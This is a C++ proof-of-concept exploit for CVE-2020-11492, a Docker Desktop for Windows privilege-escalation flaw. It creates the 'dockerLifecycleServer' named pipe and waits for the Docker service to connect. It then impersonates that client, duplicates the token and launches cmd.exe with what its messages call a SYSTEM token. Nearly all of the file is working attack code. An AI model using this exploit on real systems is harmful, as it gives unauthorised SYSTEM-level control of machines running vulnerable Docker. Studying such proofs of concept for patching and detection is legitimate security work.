// CVE-2020-11492.cpp : PoC for docker named-pipe impersonation CVE.
//

#include <windows.h>
#include <iostream>
#include <AclAPI.h>

int main()
{
    SECURITY_ATTRIBUTES SecurityAttrs = {
        sizeof(SECURITY_ATTRIBUTES),
        NULL,                               // assigned access token of calling process
        FALSE
    };

    DWORD openMode = PIPE_ACCESS_DUPLEX | FILE_FLAG_FIRST_PIPE_INSTANCE | WRITE_OWNER;
    DWORD pipeMode = PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT;

    std::cout << "[+] Creating pipe server\n";
    for (;;) {
        // create the named pipe
        HANDLE pipe = NULL;

        DWORD msgSize = 1024;
        pipe = CreateNamedPipeA(
            "\\\\.\\pipe\\dockerLifecycleServer",
            openMode,
            pipeMode,
            1,              // max instances
            msgSize,        // out buffer size
            msgSize,        // in buffer size
            0,              // timeout. 0 ~= 50ms
            &SecurityAttrs);

        if (pipe == INVALID_HANDLE_VALUE) {
            DWORD err = GetLastError();
            std::cout << "[!] Pipe creation failed! " << err << std::endl;
            return err;
        }

        // wait for docker to connect to the client
        std::cout << "[+] Waiting for docker to connect\n";
        bool connected = ConnectNamedPipe(pipe, NULL) ? true : (
            GetLastError() == ERROR_PIPE_CONNECTED);
        if (!connected)
            continue;
        std::cout << "[+] Client connected\n";

        // read byte from pipe
        char buf[1024];
        DWORD bytesread = 0;
        bool status = ReadFile(
            pipe,
            &buf,
            msgSize,
            &bytesread,
            NULL);

        // impersoante the connector
        if (!ImpersonateNamedPipeClient(pipe)) {
            DWORD err = GetLastError();
            std::cout << "[!] Impersonation failed! " << err << std::endl;
            return -1;
        }
        std::cout << "[+] Docker impersonated!\n";

        HANDLE hToken = {};

        if (!OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, false, &hToken)) {
            DWORD err = GetLastError();
            std::cout << "[!] Failed to get thread token! " << err << std::endl;
            return err;
        }
        
        HANDLE hDuplicateToken = new HANDLE;
        if (!DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary, &hDuplicateToken)) {
            DWORD err = GetLastError();
            std::cout << "[!] Could not duplicate token! " << err << std::endl;
            return err;
        }
        std::cout << "[+] Docker token has been duplicated\n";

        // launch a new process with the connector's token
        PROCESS_INFORMATION pi = {};
        STARTUPINFOW si = {};
        GetStartupInfoW(&si);

        HANDLE threadToken = GetCurrentThreadToken();
        std::cout << "[+] Launching process with token " << hDuplicateToken << std::endl;
        if (!CreateProcessWithTokenW(
                hDuplicateToken,
                0,
                L"C:\\Windows\\System32\\cmd.exe",
                NULL,                   // command line args      
                CREATE_NEW_CONSOLE,     // creation flags
                NULL,                   // environment block
                NULL,                   // current directory
                &si,                    // startup info
                &pi                     // process info
            )) 
        {
            DWORD err = GetLastError();
            std::cout << "[-] failed to open new process with SYSTEM token" << err << std::endl;
            return err;
        }

        std::cout << "[+] process created with new token\n";
        break;
    }
    
    return 0;
}